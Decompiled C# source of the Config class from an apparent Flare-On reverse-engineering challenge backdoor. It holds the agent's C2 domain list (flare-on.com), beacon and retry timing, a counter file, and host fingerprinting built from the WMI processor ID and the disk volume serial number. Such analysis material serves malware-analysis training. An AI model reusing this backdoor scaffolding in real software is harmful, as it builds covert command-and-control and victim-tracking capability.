using System;
using System.Collections.Generic;
using System.IO;
using System.Management;

namespace FlareOn.Backdoor
{
	// Token: 0x02000005 RID: 5
	public class Config
	{
		// Token: 0x06000012 RID: 18 RVA: 0x000026D0 File Offset: 0x000096D0
		public static void flared_06()
		{
			bool flag = !Config.flare_13();
			if (flag)
			{
				Config._counter = FLARE10.flare_40(0, Config._max_counter);
				Config._WriteCounterToFile();
			}
			TaskClass.ListData = new List<byte[]>();
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000270C File Offset: 0x0000970C
		public static void flare_07()
		{
			try
			{
				Config.flared_06();
			}
			catch (InvalidProgramException e)
			{
				Util.flare_70(e, null);
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002089 File Offset: 0x00009089
		public static void SetAgentIdWriteToFile(int a)
		{
			Config._agent_id = new int?(a);
			Config._WriteCounterToFile();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002744 File Offset: 0x00009744
		public static void _SetAgentIdWriteToFile(int a)
		{
			try
			{
				Config.SetAgentIdWriteToFile(a);
			}
			catch (InvalidProgramException e)
			{
				Util.flare_70(e, new object[]
				{
					a
				});
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002788 File Offset: 0x00009788
		public static void IncrementCounterAndWriteToFile()
		{
			Config._counter++;
			bool flag = Config._counter >= Config._max_counter;
			if (flag)
			{
				Config._counter = 0;
			}
			Config._WriteCounterToFile();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000027C4 File Offset: 0x000097C4
		public static void _IncrementCounterAndWriteToFile()
		{
			try
			{
				Config.IncrementCounterAndWriteToFile();
			}
			catch (InvalidProgramException e)
			{
				Util.flare_70(e, null);
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000027FC File Offset: 0x000097FC
		public static int FetchCounter()
		{
			return Config._counter;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002814 File Offset: 0x00009814
		public static int _FetchCounter()
		{
			int result;
			try
			{
				result = Config.FetchCounter();
			}
			catch (InvalidProgramException e)
			{
				result = (int)Util.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002850 File Offset: 0x00009850
		public static int? GetAgentId()
		{
			return Config._agent_id;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002868 File Offset: 0x00009868
		public static int? _GetAgentId()
		{
			int? result;
			try
			{
				result = Config.GetAgentId();
			}
			catch (InvalidProgramException e)
			{
				result = (int?)Util.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000028A4 File Offset: 0x000098A4
		public static bool WriteCounterToFile()
		{
			try
			{
				File.WriteAllText("flare.agent.id", ((Config._agent_id != null) ? Config._agent_id.Value.ToString() : "-") + Environment.NewLine + Config._counter.ToString());
			}
			catch (Exception ex)
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002918 File Offset: 0x00009918
		public static bool _WriteCounterToFile()
		{
			bool result;
			try
			{
				try
				{
					result = Config.WriteCounterToFile();
				}
				catch (InvalidProgramException e)
				{
					result = (bool)Util.flare_70(e, null);
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002964 File Offset: 0x00009964
		public static bool flared_12()
		{
			try
			{
				FLARE11.flare_41(5489U);
				string[] array = File.ReadAllLines("flare.agent.id");
				bool flag = array[0] != "-";
				if (flag)
				{
					Config._agent_id = new int?(int.Parse(array[0]));
				}
				Config._counter = int.Parse(array[1]);
			}
			catch (Exception ex)
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000029DC File Offset: 0x000099DC
		public static bool flare_13()
		{
			bool result;
			try
			{
				try
				{
					result = Config.flared_12();
				}
				catch (InvalidProgramException e)
				{
					result = (bool)Util.flare_70(e, null);
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002A28 File Offset: 0x00009A28
		public static string flared_13()
		{
			int num = FLARE10.flare_40(0, Config._domains.Length - 1);
			return Config._domains[num];
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002A54 File Offset: 0x00009A54
		public static string flare_14()
		{
			string result;
			try
			{
				result = Config.flared_13();
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002A90 File Offset: 0x00009A90
		public static string flared_14()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_processor");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			string result = "";
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = managementObject["ProcessorID"].ToString();
			}
			return result;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002B10 File Offset: 0x00009B10
		public static string flare_15()
		{
			string result;
			try
			{
				result = Config.flared_14();
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00002B4C File Offset: 0x00009B4C
		public static string flared_15(string d)
		{
			ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + d + ":\"");
			managementObject.Get();
			string result = managementObject["VolumeSerialNumber"].ToString();
			managementObject.Dispose();
			return result;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002B94 File Offset: 0x00009B94
		public static string flare_16(string drive)
		{
			string result;
			try
			{
				result = Config.flared_15(drive);
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, new object[]
				{
					drive
				});
			}
			return result;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002BD8 File Offset: 0x00009BD8
		public static string flared_16()
		{
			string text = "C:\\";
			bool flag = text == string.Empty;
			if (flag)
			{
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					bool isReady = driveInfo.IsReady;
					if (isReady)
					{
						text = driveInfo.RootDirectory.ToString();
						break;
					}
				}
			}
			bool flag2 = text.EndsWith(":\\");
			if (flag2)
			{
				text = text.Substring(0, text.Length - 2);
			}
			string str = Config.flare_16(text);
			string text2 = Config.flare_15();
			return text2.Substring(13) + text2.Substring(1, 4) + str + text2.Substring(4, 4);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002C94 File Offset: 0x00009C94
		public static string flare_17()
		{
			string result;
			try
			{
				result = Config.flared_16();
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x04000003 RID: 3
		public static int min_alive_delay = 2160000;

		// Token: 0x04000004 RID: 4
		public static int max_alive_delay = 2880000;

		// Token: 0x04000005 RID: 5
		public static int min_comm_delay = 0;

		// Token: 0x04000006 RID: 6
		public static int max_comm_delay = 1;

		// Token: 0x04000007 RID: 7
		public static int min_check_delay = 180000;

		// Token: 0x04000008 RID: 8
		public static int max_check_delay = 270000;

		// Token: 0x04000009 RID: 9
		public static int min_retry_delay = 30000;

		// Token: 0x0400000A RID: 10
		public static int max_retry_delay = 42000;

		// Token: 0x0400000B RID: 11
		public static int max_try = 7;

		// Token: 0x0400000C RID: 12
		public static int task_timeout = 15000;

		// Token: 0x0400000D RID: 13
		public static int send_count = 12;

		// Token: 0x0400000E RID: 14
		public static string CharsDomain = "abcdefghijklmnopqrstuvwxyz0123456789";

		// Token: 0x0400000F RID: 15
		public static string chars_counter = "amsjl6zci20dbt35guhw7n1fqvx4k8y9rpoe";

		// Token: 0x04000010 RID: 16
		public static string alive_key = "flareon";

		// Token: 0x04000011 RID: 17
		public static string[] _domains = new string[]
		{
			"flare-on.com"
		};

		// Token: 0x04000012 RID: 18
		public static int? _agent_id = null;

		// Token: 0x04000013 RID: 19
		public static int _counter;

		// Token: 0x04000014 RID: 20
		public static int _max_counter = 46656;
	}
}
